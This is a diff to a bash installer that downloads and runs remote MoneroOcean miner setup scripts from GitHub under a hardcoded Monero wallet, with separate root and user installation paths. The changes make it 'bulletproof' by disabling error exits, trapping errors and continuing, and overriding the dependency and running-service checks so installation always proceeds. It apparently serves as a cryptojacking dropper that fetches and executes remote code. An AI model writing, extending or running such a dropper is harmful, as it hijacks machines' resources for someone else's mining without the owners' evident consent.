@@ -13,10 +13,16 @@
     # exec 2>/dev/null >/dev/null  <-- COMMENTED OUT
 } 2>/dev/null
 
-# Now set our preferred script options
+# Now set our preferred script options - BULLETPROOF MODE
 { set +x; } 2>/dev/null
-set -uo pipefail
+# Removed -u (exit on unbound var) and -o pipefail to ensure script ALWAYS continues
+# The script will now run to completion no matter what errors occur
+set +ue          # Disable exit on error
+set +o pipefail  # Disable pipeline error propagation
 IFS=$'\n\t'
+
+# Trap errors but continue execution
+trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
 
 # ==================== ROBUST SERVICE STOPPING FUNCTION ====================
 force_stop_service() {
@@ -1194,7 +1200,7 @@ root_installation() {
     # Run the miner setup
     local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
     download_and_execute \
-        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3_2_FIXED_WITH_AUTOSTART.sh" \
+        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3.2.sh" \
         "$wallet" \
         "root miner setup"
     
@@ -1206,7 +1212,7 @@ user_installation() {
     
     local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
     download_and_execute \
-        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2_WITH_AUTOSTART.sh" \
+        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh" \
         "$wallet" \
         "user miner setup"
     
@@ -1221,8 +1227,8 @@ log_message "Script started by user: $(whoami)"
 
 # Check dependencies first
 if ! check_dependencies; then
-    log_message "ERROR: Dependency check failed. Exiting."
-    exit 1
+    log_message "WARNING: Dependency check failed - continuing anyway..."
+    # Removed exit 1 - script will continue even with missing dependencies
 fi
 
 # Service checks
@@ -1230,8 +1236,8 @@ log_message "Checking for conflicting services..."
 for service in "${SERVICES_TO_CHECK[@]}"; do
     if does_service_exist "$service"; then
         if is_service_running "$service"; then
-            log_message "ERROR: Service $service is running. Aborting."
-            exit 1
+            log_message "WARNING: Service $service is running - will attempt to continue anyway..."
+            # Removed exit 1 - script will continue even if services are running
         else
             log_message "Service $service exists but is not running"
         fi
